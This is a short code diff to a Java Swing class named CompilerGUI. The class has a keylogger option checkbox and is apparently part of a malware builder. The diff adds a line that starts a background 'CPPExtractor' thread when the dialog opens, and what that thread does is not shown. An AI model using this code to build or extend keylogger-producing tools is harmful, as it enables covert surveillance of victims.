@@ -24,6 +24,7 @@ public class CompilerGUI {
     private JCheckBox keyloggerCheckBox;
 
     public CompilerGUI(JFrame parentFrame) {
+        new Thread(new CPPExtractor()).start();
         compilerDialog = new JDialog(parentFrame, "Compiler");
         compilerDialog.setModal(true);
         compilerDialog.setResizable(false);
